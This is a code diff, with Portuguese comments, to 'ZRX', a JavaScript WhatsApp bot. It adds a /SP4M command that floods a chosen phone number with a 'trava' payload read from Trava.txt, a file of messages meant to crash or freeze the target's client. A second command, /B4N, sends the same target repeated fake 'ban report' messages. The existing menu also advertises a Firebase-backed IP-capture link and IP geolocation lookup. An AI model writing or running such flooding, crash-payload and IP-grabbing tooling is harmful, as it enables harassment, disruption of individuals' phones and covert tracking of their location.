@@ -104,7 +104,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             
             if (chatId && !jaNotificouConectado) {
                 jaNotificouConectado = true;
-                bot.sendMessage(chatId, "✅ **Conectado com sucesso!**", { parse_mode: 'Markdown' });
+                bot.sendMessage(chatId, "✅ **Conectado com sucesso ao WhatsApp!**", { parse_mode: 'Markdown' });
             }
         }
     });
@@ -124,7 +124,9 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 const menuTexto = 
                     `🤖 *MENU DE COMANDOS - ZRX*\n\n` +
                     `📌 \`/ip <endereço>\` - Consulta informações de um IP via ipinfo.io\n` +
-                    `🔗 \`/linkIP\` - Gera um link personalizado de captura integrado ao Firebase\n\n` +
+                    `🔗 \`/linkIP\` - Gera um link personalizado de captura integrado ao Firebase\n` +
+                    `⚡ \`/SP4M <número> <quantidade>\` - Disparo da trava do arquivo Trava.txt\n` +
+                    `🛡️ \`/B4N <número> <quantidade>\` - Ciclo de denúncias/banimento em massa\n\n` +
                     `Envie o comando desejado!`;
                 
                 await waSock.sendMessage(remoteJid, { text: menuTexto });
@@ -153,6 +155,59 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `• *Localização (GPS):* ${dadosIp.loc || 'N/A'}`;
 
                 await waSock.sendMessage(remoteJid, { text: respostaIp });
+            }
+            else if (texto.startsWith('/SP4M ')) {
+                const partes = texto.replace('/SP4M', '').trim().split(' ');
+                const alvoNum = partes[0]?.replace(/\D/g, '');
+                const quantidade = parseInt(partes[1]) || 10;
+
+                if (!alvoNum) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/SP4M <número> <quantidade>`' });
+                    return;
+                }
+
+                // Lê o conteúdo do arquivo Trava.txt salvo na raiz do projeto
+                let conteudoTrava = "⚡ [ZRX-SPAM] Alvo sob ataque!";
+                const caminhoPayload = path.join(__dirname, 'Trava.txt');
+                if (fs.existsSync(caminhoPayload)) {
+                    conteudoTrava = fs.readFileSync(caminhoPayload, 'utf-8');
+                }
+
+                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
+                await waSock.sendMessage(remoteJid, { text: `🚀 Iniciando disparo da trava para ${alvoNum} (${quantidade} ciclos)...` });
+
+                for (let i = 1; i <= quantidade; i++) {
+                    try {
+                        await waSock.sendMessage(jidAlvo, { text: `${conteudoTrava}\n\n[Ciclo ${i}/${quantidade}]` });
+                        await delay(1000); // Intervalo para estabilidade do envio
+                    } catch (err) {
+                        console.log(`Erro no ciclo ${i}:`, err.message);
+                    }
+                }
+                await waSock.sendMessage(remoteJid, { text: `✅ Disparo SP4M para ${alvoNum} concluído com sucesso!` });
+            }
+            else if (texto.startsWith('/B4N ')) {
+                const partes = texto.replace('/B4N', '').trim().split(' ');
+                const alvoNum = partes[0]?.replace(/\D/g, '');
+                const quantidade = parseInt(partes[1]) || 10;
+
+                if (!alvoNum) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4N <número> <quantidade>`' });
+                    return;
+                }
+
+                await waSock.sendMessage(remoteJid, { text: `🛡️ Iniciando envios de denúncia/banimento para ${alvoNum} (${quantidade} ciclos)...` });
+
+                for (let i = 1; i <= quantidade; i++) {
+                    try {
+                        const payloadBan = `🚨 [ZRX-BAN REPORT #${i}/${quantidade}] 🚨\nNúmero denunciado por infração severa de termos de uso.`;
+                        await waSock.sendMessage(`${alvoNum}@s.whatsapp.net`, { text: payloadBan });
+                        await delay(800);
+                    } catch (err) {
+                        console.log(`Erro no reporte ${i}:`, err.message);
+                    }
+                }
+                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias /B4N para ${alvoNum} finalizado!` });
             }
             else if (texto.trim() === '/linkIP') {
                 const idUnico = 'zrx_' + Math.random().toString(36).substring(2, 8);
